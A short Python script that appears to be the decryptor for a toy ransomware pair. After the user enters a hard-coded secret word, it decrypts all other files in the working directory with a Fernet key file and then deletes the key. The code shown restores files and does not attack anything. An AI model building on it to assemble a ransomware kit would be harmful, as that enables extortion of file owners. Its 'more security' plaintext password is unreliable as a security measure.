import os 
import time 
from cryptography.fernet import Fernet


files = []

# find available files 

for file in os.listdir() :
    if file == "hungryGuy.py" or file == "accessKey.key" or file =="notHungry.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# read generated accessKey 
with open("accessKey.key", "rb") as accessKey:
    secret_key = accessKey.read()


# more security 
secret_word = "abcdef"

user_secret_word = input("Enter the secret word to decrypt your files\n ")

# Decrypt files 
if secret_word == user_secret_word:
    for file in files:
        with open(file, "rb") as theFiles:
            contents=theFiles.read()
        contents_decrypt=Fernet(secret_key).decrypt(contents)

        with open(file, "wb") as theFiles:
                theFiles.write(contents_decrypt)
    print("Decryption success!")
    # Format existing key or remove key file 
    print("Formatting Key...!")
    time.sleep(2)
    if os.path.exists("accessKey.key"):
        os.remove("accessKey.key")
        print("Key formatted!")
    else:
        print("No key found")
else:
    print("Try agin!!!")